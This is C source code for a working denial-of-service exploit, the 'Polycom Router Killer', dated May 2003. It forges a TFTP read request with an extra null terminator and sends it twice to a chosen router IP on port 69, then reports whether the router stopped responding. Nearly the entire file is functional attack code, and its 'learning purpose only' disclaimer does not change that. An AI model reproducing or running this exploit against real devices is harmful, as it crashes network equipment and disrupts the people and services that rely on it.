/*
*******************************************************************
* NoMoreSecrets and Damned Animal presents............
* The router TFTP DOS exploit:
*
*  Bug Monitoring:Lorenzo Cerulli -Fabio Annunizato
*  Protocol inspection: Lorenzo Cerulli- Fabio Annunziato
*  Programming: Lorenzo Cerulli
*  Testing: Lorenzo Cerulli -Fabio Annunziato
*
* TFTP WILD PACKET  Denial of Service
* lcerulli@dnsitalia.com or lcerulli@e26.it (NoMoreSecrets)
* fn@e26.it (DA)
*
* Part of this code come form a free TFTP client/server for linux develped by
* shwin N     <ashwin_n@gmx.net>
* Abhinand D S <abhinand_ds@yahoo.com>
*
*
* DISCALIMER
*
* This code is for leraning purpouse only and we are not responsible
* in any way for improper use of this code.
* Please do not release this code to public domain till the HW
* producer as been
* allerted.
* USE AT YOUR OWN RISK
*
* And please give credits where credts are due
*
* Best Regards
* Lorenzo Cerulli
*
* Compiled with LCC - Free WIN32 Compiler System by Jacob Navia
*****************************************************************
*/



#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include "routerkiller.h"

char send_buf[PKTSIZE];		// send buffer
char recv_buf[PKTSIZE];		// recv buffer
//char data_buf[MAXDATA]; //unused

//TFTP TRANSFER MODES
const int NETASCII = 1;
const int OCTET = 2;


int write_buf(struct packet pkt)
{
	short * sp = NULL;
	char * cp = NULL;
	int i;
	int len = 0;

	switch(pkt.opcode)
	{
	case RRQ:	/* write opcode */
		sp = (short *)send_buf;
		*sp = htons(pkt.opcode);

		/* write filename */
		cp = &send_buf[2];
		for(i = 0; pkt.mid.fname[i] != '\0'; ++i)
		{
			*cp = pkt.mid.fname[i];
			++cp;
		}
		*cp = '\0';
		//This is the hack, write double ZERO terminator...bye bye router!!:)
		++cp;

		*cp='\0';
		++cp;

		//Writing the transfer MODE (OCTET or NETASCII)
		for(i = 0; pkt.stuff[i] != '\0'; ++i)
		{
			*cp = pkt.stuff[i];
			++cp;
		}
		*cp = '\0';
		len = (cp - send_buf) + 1;

		break;

	default:
		printf("Packet Wrong: Not accepted Opcode\n");

		exit(1);

		break;
	}

	return len;
}


char * FTMode(int mode)
{
	if(mode == NETASCII)
		return "netascii";
	else
	    return "octet";
}

int make_RRQ_packet(char *fname, int mode)
{
	struct packet pkt;

	pkt.opcode = RRQ;
	pkt.mid.fname = fname;
	pkt.stuff = FTMode(mode);

	return(write_buf(pkt));
}




void buf_to_pkt(char *buf, struct packet *pkt)
{
	char *cp = NULL;

	switch(ntohs(*((short *)buf)))
	{
	case RRQ:
		pkt->opcode = RRQ;
		(pkt->mid).fname = &buf[2];
		for(cp = &buf[2]; *cp != '\0'; ++cp);
		pkt->stuff = ++cp;
		break;

	case ACK:
		pkt->opcode = ACK;
		(pkt->mid).blkno = ntohs(*((short *) &buf[2]));
		break;

	case ERR:
		pkt->opcode = ERR;
		(pkt->mid).errcode = ntohs(*((short *) &buf[2]));
		pkt->stuff = &buf[4];
		break;

	default:
		printf("Invalid opcode in Packet during BUFF to PACKET conversion\n");
		exit(1);
		break;
	}
}


void recv_buf_to_pkt(struct packet *pkt)
{
	buf_to_pkt(recv_buf, pkt);
}


void print_buf(char *buf)
{
	struct packet pkt;

	buf_to_pkt(buf, &pkt);


	if(pkt.opcode < 1 || pkt.opcode > 5){
		printf("Illegal opcode in packet: print_buf\n");
		return;
	}

	switch(pkt.opcode)
	{
	case RRQ:
		printf("[  RRQ Packet  ]\n");
		printf("filename : %s\n", pkt.mid.fname);
		printf("mode     : %s\n\n", pkt.stuff);
		break;


	case ACK:
		printf("[ ACK Packet ]\n");
		printf("blkno : %d\n\n", pkt.mid.blkno);
		break;

	case ERR:
		printf("[ ERR Packet ]\n");
		printf("errcode : %d\n", pkt.mid.errcode);
		printf("errstr  : %s\n\n", pkt.stuff);
		break;

	default:
		break;
	}
}


void Usage(char *pname){

	printf("%s ROUTER_IP_ADDR [PORT_NUM=69]\n",pname);
	return;
}

int main(int argc,char *argv[])
{

	WORD wVersionRequested;
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in mserv_addr,serv_addr;
	unsigned long inaddr = 0;
	int len;

	struct packet pkt; //Packet Structure
	char IP_ADDR[255];  //IP ADDRESS
	char *fname="filename";//Bogus Filename
	int destPORT = 69;//Default to 69

	struct timeval timeout; //timeout for select()
	fd_set  readfds;


	printf("Polycom Router Killer by NoMoreSecrets and Damned Animal\n");
	printf("1 May 2003 (Italy)\n\n");

	if (argc < 2) {

		Usage(argv[0]);
		return -1;
	}


	if (argc==3)
		destPORT=atoi(argv[2]);


	printf("Requesting Winsock...\n");


	wVersionRequested = MAKEWORD( 2, 2 );
	len = WSAStartup( wVersionRequested, &wsaData );

	if ( len != 0 ) {
		printf("No winsock suitable version found!");
		return -1;
	}



	memset((char *) &mserv_addr, 0, sizeof(mserv_addr));
	mserv_addr.sin_family      = AF_INET;
	mserv_addr.sin_port        = htons((u_short) destPORT);


	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
		printf("Can't create UDP socket\n");
		exit(1);
	}


	strncpy(IP_ADDR, argv[1], sizeof(IP_ADDR));


	if ( (inaddr = inet_addr(IP_ADDR)) != INADDR_NONE) {
		memcpy((char *) &mserv_addr.sin_addr, (char *) &inaddr, sizeof(inaddr));

	}
	else{
		printf("Invalid IP address: Address must be in dotted format -> 128.34.55.XX\n");
		return -1;
	}

	len=0;
    /* Setting descriptor parameters*/

	timeout.tv_sec = 5;
	timeout.tv_usec =0;

	FD_ZERO( &readfds );
	FD_SET ( sockfd, &readfds );


	printf("Ready to send MAGIC PACKET...\nDest IP: %s\nDest Port:%d\n\n",IP_ADDR,destPORT);

	len = make_RRQ_packet(fname,NETASCII); //Forging the packet , try to use OCTET instead

	printf("RRQ->Sending 2 packets. Size:: %d\n",len);


	if(sendto(sockfd, send_buf, len, 0, (struct sockaddr *) &mserv_addr, sizeof(mserv_addr)) != len)
		printf("Error sending first packet\n");


	if(sendto(sockfd, send_buf, len, 0, (struct sockaddr *) &mserv_addr, sizeof(mserv_addr)) != len)
		printf("Error sending second packet\n");

	printf("Packet sent........\n");

	int servlen = sizeof(serv_addr);

	printf("Waiting remote host response:\n");

	//Setting socket in nonblocking mode
	int noblock=1;

	ioctlsocket(sockfd,FIONBIO,&noblock);

    //Wait for a socket ready or for timeout

	len = select(sockfd+1, &readfds, NULL, NULL, &timeout);

	if (len<=0){

		printf("Timeout exceded: Router is vulnerable or no TFTP server Available\n");
		printf("Ping the router to check if it's down\n");
		WSACleanup();
		return 0;
	}


	len = recvfrom(sockfd, recv_buf, PKTSIZE, 0, (struct sockaddr *) &serv_addr, &servlen);

	if(len < 0)
		printf("Router is up but-> Error reciving packet:\n");

	recv_buf_to_pkt(&pkt);

	print_buf(recv_buf);
	printf("Response from the router: TFTP server up->not vulnerable to attack\n");


	WSACleanup();


	return 0;
}
